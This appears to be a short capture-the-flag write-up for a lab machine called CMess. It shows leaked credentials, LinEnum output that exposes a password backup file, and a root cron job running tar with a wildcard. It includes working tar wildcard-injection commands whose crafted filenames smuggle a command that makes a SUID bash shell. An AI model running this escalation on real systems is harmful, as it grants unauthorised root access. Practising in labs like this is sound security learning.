

Initial access is `dev.cmess.thm`

```
andre@cmess.thm:KPFTN_f2yxe%
```


```
#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Tue Mar 12 02:40:04 PDT 2024


### SYSTEM ##############################################
[-] Kernel information:
Linux cmess 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.4.0-142-generic (buildd@lgw01-amd64-033) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019

[-] Super user account(s):
root


[-] Are permissions on /home directories lax:
total 12K
drwxr-xr-x  3 root  root  4.0K Feb  6  2020 .
drwxr-xr-x 22 root  root  4.0K Feb  6  2020 ..
drwxr-x---  4 andre andre 4.0K Feb  9  2020 andre


<...SNIP...>


[-] Location and Permissions (if accessible) of .bak file(s):
-rw-r--r-- 1 root root 3020 Feb  6  2020 /etc/apt/sources.bak  <------------- at the very end of the scan
-rwxrwxrwx 1 root root 36 Feb  6  2020 /opt/.password.bak  <---------------


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Feb 26  2019 .
drwxr-xr-x 12 root root 4096 Feb  6  2020 ..


[-] Anything juicy in the Dockerfile:
-rwxrwxrwx 1 root root 639 Jul 10  2019 /var/www/html/Dockerfile

```

To get `andre` use linenum and remember to check every file and every THING

```
www-data@cmess:/var/www/html/tmp$ cat /opt/.password.bak
cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6

```

now we SSH

---



getting root


```
bash-4.3# cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz * <------------

```


```
andre@cmess:~/backup$ cat note
Note to self.
Anything in here will be backed up!
```

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andre/backup/runme.sh
chmod +x runme.sh
touch /home/andre/backup/--checkpoint=1
touch /home/andre/backup/--checkpoint-action=exec=sh\ runme.sh
```




## Hiccups

I was super duper fucking annoyed and fucked up doing shit manually, while there was a rabbithole i should have tried something else to make sure i cant import any tools before i started doing things manually, but once i got into the right track everything fell right into its place and i was able to root it pretty quick